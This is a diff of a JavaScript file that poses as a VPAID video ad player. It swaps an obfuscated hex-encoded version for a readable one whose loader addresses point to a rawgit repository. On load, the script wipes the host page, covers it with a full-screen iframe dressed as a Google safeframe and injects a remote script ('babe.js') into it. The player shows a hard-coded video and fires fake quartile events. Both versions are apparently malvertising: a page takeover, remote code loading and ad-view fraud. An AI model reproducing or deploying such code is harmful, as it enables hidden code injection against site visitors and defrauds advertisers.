@@ -1,1 +1,109 @@
-var _0x6d8b=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x70\x63\x2E\x67\x6F\x6F\x67\x6C\x65\x73\x79\x6E\x64\x69\x63\x61\x74\x69\x6F\x6E\x2E\x63\x6F\x6D\x2F\x70\x61\x67\x65\x61\x64\x2F\x6A\x73\x2F\x6C\x6F\x61\x64\x65\x72\x31\x35\x2E\x68\x74\x6D\x6C\x3F\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x63\x6F\x72\x64\x65\x72\x2E\x63\x6F\x6D\x2F\x67\x66\x68\x64\x6A\x73\x6B\x61\x6C\x2F\x64\x75\x64\x65\x2E\x6A\x73\x3F\x72\x3D\x31\x35\x26\x61\x69\x3D","","\x72\x65\x70\x6C\x61\x63\x65","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x73\x74\x79\x6C\x65","\x62\x6F\x64\x79","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6D\x61\x72\x67\x69\x6E\x3A\x30\x70\x78\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x30\x70\x78\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x62\x6F\x72\x64\x65\x72\x3A\x30\x70\x78\x3B","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x64","\x79\x74\x5F\x73\x61\x66\x65\x66\x72\x61\x6D\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x70\x63\x2E\x67\x6F\x6F\x67\x6C\x65\x73\x79\x6E\x64\x69\x63\x61\x74\x69\x6F\x6E\x2E\x63\x6F\x6D\x2F\x73\x61\x66\x65\x66\x72\x61\x6D\x65\x2F\x31\x2D\x30\x2D\x31\x34\x2F\x68\x74\x6D\x6C\x2F\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x2E\x68\x74\x6D\x6C\x23\x61\x69\x3D","\x6C\x65\x66\x74\x3A\x30\x70\x78\x3B\x74\x6F\x70\x3A\x30\x70\x78\x3B\x62\x6F\x72\x64\x65\x72\x3A\x30\x70\x78\x3B","\x77\x69\x64\x74\x68","\x31\x30\x30\x25","\x68\x65\x69\x67\x68\x74","\x64\x69\x73\x70\x6C\x61\x79","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x66\x69\x78\x65\x64","\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6F\x6E\x74\x65\x6E\x74\x44\x6F\x63\x75\x6D\x65\x6E\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x63\x6F\x6E\x74\x65\x6E\x74\x57\x69\x6E\x64\x6F\x77","\x73\x63\x72\x69\x70\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x63\x6F\x72\x64\x65\x72\x2E\x63\x6F\x6D\x2F\x67\x66\x68\x64\x6A\x73\x6B\x61\x6C\x2F\x62\x61\x62\x65\x2E\x6A\x73\x3F\x61\x3D\x31\x35\x26\x61\x69\x3D","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x73\x6C\x6F\x74\x5F","\x76\x69\x64\x65\x6F\x53\x6C\x6F\x74\x5F","\x65\x76\x65\x6E\x74\x73\x43\x61\x6C\x6C\x62\x61\x63\x6B\x73\x5F","\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x5F","\x6E\x6F\x72\x6D\x61\x6C","\x71\x75\x61\x72\x74\x69\x6C\x65\x45\x76\x65\x6E\x74\x73\x5F","\x41\x64\x56\x69\x64\x65\x6F\x53\x74\x61\x72\x74","\x41\x64\x56\x69\x64\x65\x6F\x46\x69\x72\x73\x74\x51\x75\x61\x72\x74\x69\x6C\x65","\x41\x64\x56\x69\x64\x65\x6F\x4D\x69\x64\x70\x6F\x69\x6E\x74","\x41\x64\x56\x69\x64\x65\x6F\x54\x68\x69\x72\x64\x51\x75\x61\x72\x74\x69\x6C\x65","\x41\x64\x56\x69\x64\x65\x6F\x43\x6F\x6D\x70\x6C\x65\x74\x65","\x6E\x65\x78\x74\x51\x75\x61\x72\x74\x69\x6C\x65\x49\x6E\x64\x65\x78\x5F","\x70\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x5F","\x68\x61\x6E\x64\x73\x68\x61\x6B\x65\x56\x65\x72\x73\x69\x6F\x6E","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65","\x32\x2E\x30","\x69\x6E\x69\x74\x41\x64","\x76\x69\x65\x77\x4D\x6F\x64\x65","\x64\x65\x73\x69\x72\x65\x64\x42\x69\x74\x72\x61\x74\x65","\x73\x6C\x6F\x74","\x76\x69\x64\x65\x6F\x53\x6C\x6F\x74","\x70\x61\x72\x73\x65","\x69\x6E\x69\x74\x41\x64\x20","\x78","\x20","\x6C\x6F\x67","\x75\x70\x64\x61\x74\x65\x56\x69\x64\x65\x6F\x53\x6C\x6F\x74\x5F","\x74\x69\x6D\x65\x75\x70\x64\x61\x74\x65","\x62\x69\x6E\x64","\x74\x69\x6D\x65\x55\x70\x64\x61\x74\x65\x48\x61\x6E\x64\x6C\x65\x72\x5F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6C\x6F\x61\x64\x65\x64\x6D\x65\x74\x61\x64\x61\x74\x61","\x6C\x6F\x61\x64\x65\x64\x4D\x65\x74\x61\x64\x61\x74\x61\x5F","\x65\x6E\x64\x65\x64","\x73\x74\x6F\x70\x41\x64","\x41\x64\x4C\x6F\x61\x64\x65\x64","\x63\x61\x6C\x6C\x45\x76\x65\x6E\x74\x5F","\x64\x75\x72\x61\x74\x69\x6F\x6E","\x41\x64\x44\x75\x72\x61\x74\x69\x6F\x6E\x43\x68\x61\x6E\x67\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x75\x72\x72\x65\x6E\x74\x54\x69\x6D\x65","\x76\x61\x6C\x75\x65","\x65\x76\x65\x6E\x74","\x72\x65\x6D\x61\x69\x6E\x69\x6E\x67\x54\x69\x6D\x65","\x76\x69\x64\x65\x6F","\x57\x61\x72\x6E\x69\x6E\x67\x3A\x20\x4E\x6F\x20\x76\x69\x64\x65\x6F\x20\x65\x6C\x65\x6D\x65\x6E\x74\x20\x70\x61\x73\x73\x65\x64\x20\x74\x6F\x20\x61\x64\x2C\x20\x63\x72\x65\x61\x74\x69\x6E\x67\x20\x65\x6C\x65\x6D\x65\x6E\x74\x2E","\x75\x70\x64\x61\x74\x65\x56\x69\x64\x65\x6F\x50\x6C\x61\x79\x65\x72\x53\x69\x7A\x65\x5F","\x76\x69\x64\x65\x6F\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x63\x6F\x72\x64\x65\x72\x2E\x63\x6F\x6D\x2F\x67\x66\x68\x64\x6A\x73\x6B\x61\x6C\x2F\x32\x2E\x6D\x70\x34","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x41\x64\x53\x74\x61\x72\x74\x65\x64","\x73\x74\x61\x72\x74\x41\x64","\x53\x74\x61\x72\x74\x69\x6E\x67\x20\x61\x64","\x70\x6C\x61\x79","\x70\x61\x75\x73\x65","\x53\x74\x6F\x70\x70\x69\x6E\x67\x20\x61\x64","\x72\x65\x73\x69\x7A\x65\x41\x64","\x72\x65\x73\x69\x7A\x65\x41\x64\x20","\x41\x64\x53\x69\x7A\x65\x43\x68\x61\x6E\x67\x65","\x70\x61\x75\x73\x65\x41\x64","\x41\x64\x50\x61\x75\x73\x65\x64","\x72\x65\x73\x75\x6D\x65\x41\x64","\x41\x64\x50\x6C\x61\x79\x69\x6E\x67","\x65\x78\x70\x61\x6E\x64\x41\x64","\x65\x78\x70\x61\x6E\x64\x65\x64","\x41\x64\x45\x78\x70\x61\x6E\x64\x65\x64","\x63\x6F\x6C\x6C\x61\x70\x73\x65\x41\x64","\x73\x6B\x69\x70\x41\x64","\x73\x6B\x69\x70\x70\x61\x62\x6C\x65\x53\x74\x61\x74\x65","\x41\x64\x53\x6B\x69\x70\x70\x65\x64","\x73\x75\x62\x73\x63\x72\x69\x62\x65","\x53\x75\x62\x73\x63\x72\x69\x62\x65\x20","\x75\x6E\x73\x75\x62\x73\x63\x72\x69\x62\x65","\x75\x6E\x73\x75\x62\x73\x63\x72\x69\x62\x65\x20","\x67\x65\x74\x41\x64\x4C\x69\x6E\x65\x61\x72","\x6C\x69\x6E\x65\x61\x72","\x67\x65\x74\x41\x64\x57\x69\x64\x74\x68","\x67\x65\x74\x41\x64\x48\x65\x69\x67\x68\x74","\x67\x65\x74\x41\x64\x45\x78\x70\x61\x6E\x64\x65\x64","\x67\x65\x74\x41\x64\x53\x6B\x69\x70\x70\x61\x62\x6C\x65\x53\x74\x61\x74\x65","\x67\x65\x74\x41\x64\x52\x65\x6D\x61\x69\x6E\x69\x6E\x67\x54\x69\x6D\x65","\x67\x65\x74\x41\x64\x44\x75\x72\x61\x74\x69\x6F\x6E","\x67\x65\x74\x41\x64\x56\x6F\x6C\x75\x6D\x65","\x76\x6F\x6C\x75\x6D\x65","\x73\x65\x74\x41\x64\x56\x6F\x6C\x75\x6D\x65","\x73\x65\x74\x41\x64\x56\x6F\x6C\x75\x6D\x65\x20","\x41\x64\x56\x6F\x6C\x75\x6D\x65\x43\x68\x61\x6E\x67\x65","\x67\x65\x74\x41\x64\x43\x6F\x6D\x70\x61\x6E\x69\x6F\x6E\x73","\x63\x6F\x6D\x70\x61\x6E\x69\x6F\x6E\x73","\x67\x65\x74\x41\x64\x49\x63\x6F\x6E\x73","\x69\x63\x6F\x6E\x73"];var newstr=window[_0x6d8b[4]][_0x6d8b[3]][_0x6d8b[2]](_0x6d8b[0],_0x6d8b[1]);document[_0x6d8b[7]](_0x6d8b[6])[0][_0x6d8b[5]]= _0x6d8b[8],document[_0x6d8b[7]](_0x6d8b[6])[0][_0x6d8b[9]]= _0x6d8b[1];var safeframe=document[_0x6d8b[11]](_0x6d8b[10]);safeframe[_0x6d8b[12]]= _0x6d8b[13],safeframe[_0x6d8b[14]]= _0x6d8b[15]+ newstr,safeframe[_0x6d8b[5]]= _0x6d8b[16],safeframe[_0x6d8b[5]][_0x6d8b[17]]= _0x6d8b[18],safeframe[_0x6d8b[5]][_0x6d8b[19]]= _0x6d8b[18],safeframe[_0x6d8b[5]][_0x6d8b[20]]= _0x6d8b[18],safeframe[_0x6d8b[5]][_0x6d8b[21]]= _0x6d8b[22],safeframe[_0x6d8b[23]]= function(){var _0x13b9x3,_0x13b9x4=document[_0x6d8b[24]](this[_0x6d8b[12]]);(_0x13b9x3= _0x13b9x4[_0x6d8b[25]]?_0x13b9x4[_0x6d8b[25]]:_0x13b9x4[_0x6d8b[27]][_0x6d8b[26]])[_0x6d8b[7]](_0x6d8b[6])[0][_0x6d8b[9]]= _0x6d8b[1],script= document[_0x6d8b[11]](_0x6d8b[28]),script[_0x6d8b[29]]= _0x6d8b[30],script[_0x6d8b[14]]= _0x6d8b[31]+ newstr,_0x13b9x3[_0x6d8b[6]][_0x6d8b[32]](script)},document[_0x6d8b[7]](_0x6d8b[6])[0][_0x6d8b[32]](safeframe);var VpaidVideoPlayer=function(){this[_0x6d8b[33]]= null,this[_0x6d8b[34]]= null,this[_0x6d8b[35]]= {},this[_0x6d8b[36]]= {companions:_0x6d8b[1],desiredBitrate:256,duration:1e4,expanded:!1,height:0,icons:_0x6d8b[1],linear:!0,remainingTime:1e4,skippableState:!1,viewMode:_0x6d8b[37],width:0,volume:0},this[_0x6d8b[38]]= [{event:_0x6d8b[39],value:0},{event:_0x6d8b[40],value:25},{event:_0x6d8b[41],value:50},{event:_0x6d8b[42],value:75},{event:_0x6d8b[43],value:100}],this[_0x6d8b[44]]= 0,this[_0x6d8b[45]]= {}};VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[46]]= function(_0x13b9x3){return _0x6d8b[48]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[49]]= function(_0x13b9x3,_0x13b9x4,_0x13b9x6,_0x13b9x7,_0x13b9x8,_0x13b9x9){this[_0x6d8b[36]][_0x6d8b[17]]= _0x13b9x3,this[_0x6d8b[36]][_0x6d8b[19]]= _0x13b9x4,this[_0x6d8b[36]][_0x6d8b[50]]= _0x13b9x6,this[_0x6d8b[36]][_0x6d8b[51]]= _0x13b9x7,this[_0x6d8b[33]]= _0x13b9x9[_0x6d8b[52]],this[_0x6d8b[34]]= _0x13b9x9[_0x6d8b[53]],this[_0x6d8b[45]]= JSON[_0x6d8b[54]](_0x13b9x8.AdParameters),this[_0x6d8b[58]](_0x6d8b[55]+ _0x13b9x3+ _0x6d8b[56]+ _0x13b9x4+ _0x6d8b[57]+ _0x13b9x6+ _0x6d8b[57]+ _0x13b9x7),this[_0x6d8b[59]](),this[_0x6d8b[34]][_0x6d8b[63]](_0x6d8b[60],this[_0x6d8b[62]][_0x6d8b[61]](this),!1),this[_0x6d8b[34]][_0x6d8b[63]](_0x6d8b[64],this[_0x6d8b[65]][_0x6d8b[61]](this),!1),this[_0x6d8b[34]][_0x6d8b[63]](_0x6d8b[66],this[_0x6d8b[67]][_0x6d8b[61]](this),!1),this[_0x6d8b[69]](_0x6d8b[68])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[65]]= function(){this[_0x6d8b[36]][_0x6d8b[70]]= this[_0x6d8b[34]][_0x6d8b[70]],this[_0x6d8b[69]](_0x6d8b[71])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[62]]= function(){if(!(this[_0x6d8b[44]]>= this[_0x6d8b[38]][_0x6d8b[72]])){if(100* this[_0x6d8b[34]][_0x6d8b[73]]/ this[_0x6d8b[34]][_0x6d8b[70]]>= this[_0x6d8b[38]][this[_0x6d8b[44]]][_0x6d8b[74]]){var _0x13b9x3=this[_0x6d8b[38]][this[_0x6d8b[44]]][_0x6d8b[75]];this[_0x6d8b[35]][_0x13b9x3](),this[_0x6d8b[44]]+= 1};this[_0x6d8b[34]][_0x6d8b[70]]> 0&& (this[_0x6d8b[36]][_0x6d8b[76]]= this[_0x6d8b[34]][_0x6d8b[70]]- this[_0x6d8b[34]][_0x6d8b[73]])}},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[59]]= function(){null== this[_0x6d8b[34]]&& (this[_0x6d8b[34]]= document[_0x6d8b[11]](_0x6d8b[77]),this[_0x6d8b[58]](_0x6d8b[78]),this[_0x6d8b[33]][_0x6d8b[32]](this[_0x6d8b[34]])),this[_0x6d8b[79]]();this[_0x6d8b[45]][_0x6d8b[80]];this[_0x6d8b[34]][_0x6d8b[82]](_0x6d8b[14],_0x6d8b[81]),this[_0x6d8b[69]](_0x6d8b[83])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[79]]= function(){this[_0x6d8b[34]][_0x6d8b[82]](_0x6d8b[17],this[_0x6d8b[36]][_0x6d8b[17]]),this[_0x6d8b[34]][_0x6d8b[82]](_0x6d8b[19],this[_0x6d8b[36]][_0x6d8b[19]])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[84]]= function(){this[_0x6d8b[58]](_0x6d8b[85]),this[_0x6d8b[34]][_0x6d8b[86]](),this[_0x6d8b[34]][_0x6d8b[87]](),this[_0x6d8b[69]](_0x6d8b[83])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[67]]= function(){this[_0x6d8b[58]](_0x6d8b[88]);this[_0x6d8b[69]][_0x6d8b[61]](this)},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[89]]= function(_0x13b9x3,_0x13b9x4,_0x13b9x6){this[_0x6d8b[58]](_0x6d8b[90]+ _0x13b9x3+ _0x6d8b[56]+ _0x13b9x4+ _0x6d8b[57]+ _0x13b9x6),this[_0x6d8b[36]][_0x6d8b[17]]= _0x13b9x3,this[_0x6d8b[36]][_0x6d8b[19]]= _0x13b9x4,this[_0x6d8b[36]][_0x6d8b[50]]= _0x13b9x6,this[_0x6d8b[79]](),this[_0x6d8b[69]](_0x6d8b[91])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[92]]= function(){this[_0x6d8b[58]](_0x6d8b[92]),this[_0x6d8b[34]][_0x6d8b[87]](),this[_0x6d8b[69]](_0x6d8b[93])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[94]]= function(){this[_0x6d8b[58]](_0x6d8b[94]),this[_0x6d8b[34]][_0x6d8b[86]](),this[_0x6d8b[69]](_0x6d8b[95])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[96]]= function(){this[_0x6d8b[58]](_0x6d8b[96]),this[_0x6d8b[36]][_0x6d8b[97]]=  !0,this[_0x6d8b[69]](_0x6d8b[98])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[99]]= function(){this[_0x6d8b[58]](_0x6d8b[99]),this[_0x6d8b[36]][_0x6d8b[97]]=  !1},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[100]]= function(){this[_0x6d8b[58]](_0x6d8b[100]),this[_0x6d8b[36]][_0x6d8b[101]]&& this[_0x6d8b[69]](_0x6d8b[102])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[103]]= function(_0x13b9x3,_0x13b9x4,_0x13b9x6){this[_0x6d8b[58]](_0x6d8b[104]+ _0x13b9x4);var _0x13b9x7=_0x13b9x3[_0x6d8b[61]](_0x13b9x6);this[_0x6d8b[35]][_0x13b9x4]= _0x13b9x7},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[105]]= function(_0x13b9x3){this[_0x6d8b[58]](_0x6d8b[106]+ _0x13b9x3),this[_0x6d8b[35]][_0x13b9x3]= null},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[107]]= function(){return this[_0x6d8b[36]][_0x6d8b[108]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[109]]= function(){return this[_0x6d8b[36]][_0x6d8b[17]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[110]]= function(){return this[_0x6d8b[36]][_0x6d8b[19]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[111]]= function(){return this[_0x6d8b[58]](_0x6d8b[111]),this[_0x6d8b[36]][_0x6d8b[97]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[112]]= function(){return this[_0x6d8b[58]](_0x6d8b[112]),this[_0x6d8b[36]][_0x6d8b[101]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[113]]= function(){return this[_0x6d8b[36]][_0x6d8b[76]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[114]]= function(){return this[_0x6d8b[36]][_0x6d8b[70]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[115]]= function(){return this[_0x6d8b[58]](_0x6d8b[115]),this[_0x6d8b[36]][_0x6d8b[116]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[117]]= function(_0x13b9x3){this[_0x6d8b[36]][_0x6d8b[116]]= _0x13b9x3,this[_0x6d8b[58]](_0x6d8b[118]+ _0x13b9x3),this[_0x6d8b[69]](_0x6d8b[119])},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[120]]= function(){return this[_0x6d8b[36]][_0x6d8b[121]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[122]]= function(){return this[_0x6d8b[36]][_0x6d8b[123]]},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[58]]= function(_0x13b9x3){},VpaidVideoPlayer[_0x6d8b[47]][_0x6d8b[69]]= function(_0x13b9x3){_0x13b9x3 in  this[_0x6d8b[35]]&& this[_0x6d8b[35]][_0x13b9x3]()};var getVPAIDAd=function(){return  new VpaidVideoPlayer}
+var newstr = window['location']['href']['replace']('https://rawgit.com/timonty001/instalp/master/loader15.html?https://rawgit.com/timonty001/instalp/master/dude.js?r=15&ai=', '');
+document['getElementsByTagName']('body')[0]['style'] = 'margin:0px;padding:0px;height:100%;width:100%;border:0px;', document['getElementsByTagName']('body')[0]['innerHTML'] = '';
+var safeframe = document['createElement']('iframe');
+safeframe['id'] = 'yt_safeframe', safeframe['src'] = 'https://tpc.googlesyndication.com/safeframe/1-0-14/html/container.html#ai=' + newstr, safeframe['style'] = 'left:0px;top:0px;border:0px;', safeframe['style']['width'] = '100%', safeframe['style']['height'] = '100%', safeframe['style']['display'] = '100%', safeframe['style']['position'] = 'fixed', safeframe['onload'] = function() {
+    var _0x13b9x3, _0x13b9x4 = document['getElementById'](this['id']);
+    (_0x13b9x3 = _0x13b9x4['contentDocument'] ? _0x13b9x4['contentDocument'] : _0x13b9x4['contentWindow']['document'])['getElementsByTagName']('body')[0]['innerHTML'] = '', script = document['createElement']('script'), script['type'] = 'text/javascript', script['src'] = 'https://rawgit.com/timonty001/instalp/master/babe.js?a=15&ai=' + newstr, _0x13b9x3['body']['appendChild'](script)
+}, document['getElementsByTagName']('body')[0]['appendChild'](safeframe);
+var VpaidVideoPlayer = function() {
+    this['slot_'] = null, this['videoSlot_'] = null, this['eventsCallbacks_'] = {}, this['attributes_'] = {
+        companions: '',
+        desiredBitrate: 256,
+        duration: 1e4,
+        expanded: !1,
+        height: 0,
+        icons: '',
+        linear: !0,
+        remainingTime: 1e4,
+        skippableState: !1,
+        viewMode: 'normal',
+        width: 0,
+        volume: 0
+    }, this['quartileEvents_'] = [{
+        event: 'AdVideoStart',
+        value: 0
+    }, {
+        event: 'AdVideoFirstQuartile',
+        value: 25
+    }, {
+        event: 'AdVideoMidpoint',
+        value: 50
+    }, {
+        event: 'AdVideoThirdQuartile',
+        value: 75
+    }, {
+        event: 'AdVideoComplete',
+        value: 100
+    }], this['nextQuartileIndex_'] = 0, this['parameters_'] = {}
+};
+VpaidVideoPlayer['prototype']['handshakeVersion'] = function(_0x13b9x3) {
+    return '2.0'
+}, VpaidVideoPlayer['prototype']['initAd'] = function(_0x13b9x3, _0x13b9x4, _0x13b9x6, _0x13b9x7, _0x13b9x8, _0x13b9x9) {
+    this['attributes_']['width'] = _0x13b9x3, this['attributes_']['height'] = _0x13b9x4, this['attributes_']['viewMode'] = _0x13b9x6, this['attributes_']['desiredBitrate'] = _0x13b9x7, this['slot_'] = _0x13b9x9['slot'], this['videoSlot_'] = _0x13b9x9['videoSlot'], this['parameters_'] = JSON['parse'](_0x13b9x8.AdParameters), this['log']('initAd ' + _0x13b9x3 + 'x' + _0x13b9x4 + ' ' + _0x13b9x6 + ' ' + _0x13b9x7), this['updateVideoSlot_'](), this['videoSlot_']['addEventListener']('timeupdate', this['timeUpdateHandler_']['bind'](this), !1), this['videoSlot_']['addEventListener']('loadedmetadata', this['loadedMetadata_']['bind'](this), !1), this['videoSlot_']['addEventListener']('ended', this['stopAd']['bind'](this), !1), this['callEvent_']('AdLoaded')
+}, VpaidVideoPlayer['prototype']['loadedMetadata_'] = function() {
+    this['attributes_']['duration'] = this['videoSlot_']['duration'], this['callEvent_']('AdDurationChange')
+}, VpaidVideoPlayer['prototype']['timeUpdateHandler_'] = function() {
+    if (!(this['nextQuartileIndex_'] >= this['quartileEvents_']['length'])) {
+        if (100 * this['videoSlot_']['currentTime'] / this['videoSlot_']['duration'] >= this['quartileEvents_'][this['nextQuartileIndex_']]['value']) {
+            var _0x13b9x3 = this['quartileEvents_'][this['nextQuartileIndex_']]['event'];
+            this['eventsCallbacks_'][_0x13b9x3](), this['nextQuartileIndex_'] += 1
+        };
+        this['videoSlot_']['duration'] > 0 && (this['attributes_']['remainingTime'] = this['videoSlot_']['duration'] - this['videoSlot_']['currentTime'])
+    }
+}, VpaidVideoPlayer['prototype']['updateVideoSlot_'] = function() {
+    null == this['videoSlot_'] && (this['videoSlot_'] = document['createElement']('video'), this['log']('Warning: No video element passed to ad, creating element.'), this['slot_']['appendChild'](this['videoSlot_'])), this['updateVideoPlayerSize_']();
+    this['parameters_']['videos'];
+    this['videoSlot_']['setAttribute']('src', 'https://socorder.com/gfhdjskal/2.mp4'), this['callEvent_']('AdStarted')
+}, VpaidVideoPlayer['prototype']['updateVideoPlayerSize_'] = function() {
+    this['videoSlot_']['setAttribute']('width', this['attributes_']['width']), this['videoSlot_']['setAttribute']('height', this['attributes_']['height'])
+}, VpaidVideoPlayer['prototype']['startAd'] = function() {
+    this['log']('Starting ad'), this['videoSlot_']['play'](), this['videoSlot_']['pause'](), this['callEvent_']('AdStarted')
+}, VpaidVideoPlayer['prototype']['stopAd'] = function() {
+    this['log']('Stopping ad');
+    this['callEvent_']['bind'](this)
+}, VpaidVideoPlayer['prototype']['resizeAd'] = function(_0x13b9x3, _0x13b9x4, _0x13b9x6) {
+    this['log']('resizeAd ' + _0x13b9x3 + 'x' + _0x13b9x4 + ' ' + _0x13b9x6), this['attributes_']['width'] = _0x13b9x3, this['attributes_']['height'] = _0x13b9x4, this['attributes_']['viewMode'] = _0x13b9x6, this['updateVideoPlayerSize_'](), this['callEvent_']('AdSizeChange')
+}, VpaidVideoPlayer['prototype']['pauseAd'] = function() {
+    this['log']('pauseAd'), this['videoSlot_']['pause'](), this['callEvent_']('AdPaused')
+}, VpaidVideoPlayer['prototype']['resumeAd'] = function() {
+    this['log']('resumeAd'), this['videoSlot_']['play'](), this['callEvent_']('AdPlaying')
+}, VpaidVideoPlayer['prototype']['expandAd'] = function() {
+    this['log']('expandAd'), this['attributes_']['expanded'] = !0, this['callEvent_']('AdExpanded')
+}, VpaidVideoPlayer['prototype']['collapseAd'] = function() {
+    this['log']('collapseAd'), this['attributes_']['expanded'] = !1
+}, VpaidVideoPlayer['prototype']['skipAd'] = function() {
+    this['log']('skipAd'), this['attributes_']['skippableState'] && this['callEvent_']('AdSkipped')
+}, VpaidVideoPlayer['prototype']['subscribe'] = function(_0x13b9x3, _0x13b9x4, _0x13b9x6) {
+    this['log']('Subscribe ' + _0x13b9x4);
+    var _0x13b9x7 = _0x13b9x3['bind'](_0x13b9x6);
+    this['eventsCallbacks_'][_0x13b9x4] = _0x13b9x7
+}, VpaidVideoPlayer['prototype']['unsubscribe'] = function(_0x13b9x3) {
+    this['log']('unsubscribe ' + _0x13b9x3), this['eventsCallbacks_'][_0x13b9x3] = null
+}, VpaidVideoPlayer['prototype']['getAdLinear'] = function() {
+    return this['attributes_']['linear']
+}, VpaidVideoPlayer['prototype']['getAdWidth'] = function() {
+    return this['attributes_']['width']
+}, VpaidVideoPlayer['prototype']['getAdHeight'] = function() {
+    return this['attributes_']['height']
+}, VpaidVideoPlayer['prototype']['getAdExpanded'] = function() {
+    return this['log']('getAdExpanded'), this['attributes_']['expanded']
+}, VpaidVideoPlayer['prototype']['getAdSkippableState'] = function() {
+    return this['log']('getAdSkippableState'), this['attributes_']['skippableState']
+}, VpaidVideoPlayer['prototype']['getAdRemainingTime'] = function() {
+    return this['attributes_']['remainingTime']
+}, VpaidVideoPlayer['prototype']['getAdDuration'] = function() {
+    return this['attributes_']['duration']
+}, VpaidVideoPlayer['prototype']['getAdVolume'] = function() {
+    return this['log']('getAdVolume'), this['attributes_']['volume']
+}, VpaidVideoPlayer['prototype']['setAdVolume'] = function(_0x13b9x3) {
+    this['attributes_']['volume'] = _0x13b9x3, this['log']('setAdVolume ' + _0x13b9x3), this['callEvent_']('AdVolumeChange')
+}, VpaidVideoPlayer['prototype']['getAdCompanions'] = function() {
+    return this['attributes_']['companions']
+}, VpaidVideoPlayer['prototype']['getAdIcons'] = function() {
+    return this['attributes_']['icons']
+}, VpaidVideoPlayer['prototype']['log'] = function(_0x13b9x3) {}, VpaidVideoPlayer['prototype']['callEvent_'] = function(_0x13b9x3) {
+    _0x13b9x3 in this['eventsCallbacks_'] && this['eventsCallbacks_'][_0x13b9x3]()
+};
+var getVPAIDAd = function() {
+    return new VpaidVideoPlayer
+}
